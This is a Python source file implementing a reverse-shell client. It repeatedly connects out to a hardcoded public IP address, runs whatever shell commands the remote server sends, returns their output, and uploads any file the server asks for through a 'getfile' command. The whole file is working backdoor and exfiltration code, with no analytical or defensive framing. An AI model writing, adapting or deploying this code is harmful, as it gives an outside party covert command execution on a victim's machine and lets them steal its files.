import socket
import time
import os
import subprocess

HEADER = 64
PORT_SHELL = 887
PORT_FILE = 888
SERVER = "127.0.0.1"
SERVER = "46.101.213.187"
FORMAT = "utf-8"
DISCONNECT_MESSAGE = "!DISCONNECT"
ADDR_SHELL = (SERVER, PORT_SHELL)
ADDR_FILE = (SERVER, PORT_FILE)
running = True


def send(conn, msg):
    more = False
    msg_encoded = msg.encode(FORMAT)
    if len(msg_encoded) > 1000:
        msg_encoded = b"MORE" + msg_encoded[:1000]
        more = True
    msg_len = len(msg_encoded)
    msg_len_encoded = str(msg_len).encode(FORMAT)
    msg_len_encoded += b" " * (HEADER - len(str(msg_len)))
    print(msg_encoded.decode(FORMAT))
    conn.send(msg_len_encoded)
    conn.send(msg_encoded)
    if more: send(conn, msg[1000:])


def receive(conn):
    try:
        msg_len = conn.recv(HEADER).decode(FORMAT)
    except:
        raise socket.timeout()
    if not msg_len:
        raise socket.timeout()
    msg_len = int(msg_len)
    msg = conn.recv(msg_len).decode(FORMAT)
    return msg


def connect(addr):
    while running:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client.connect(addr)
            return client
        except:
            time.sleep(10)


def send_file(path):
    conn = connect(ADDR_FILE)
    send(conn, path)
    with open(path, "rb") as f:
        buffer = f.read(1024)
        while buffer:
            conn.send(buffer)
            buffer = f.read(1024)


def main():
    while True:
        client_shell = connect(ADDR_SHELL)
        while True:
            command = ""
            output = ""
            try:
                command = receive(client_shell)
            except socket.timeout:
                break
            if command == "":
                continue
            elif command == "disconnect":
                continue
            split_command = command.split()
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            elif command.lower().strip() == "cd":
                send(client_shell, os.getcwd())
                continue
            elif split_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(split_command[1:]))
                except FileNotFoundError as e:
                    # if there is an error, set as the output
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""
            elif split_command[0] == "getfile":
                send_file(" ".join(split_command[1:]))
            elif command == "exit":
                send(client_shell, DISCONNECT_MESSAGE)
                exit()
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
            # send the results back to the server
            send(client_shell, output)
        if command == "exit":
            break
        client_shell.close()


if __name__ == "__main__":
    main()
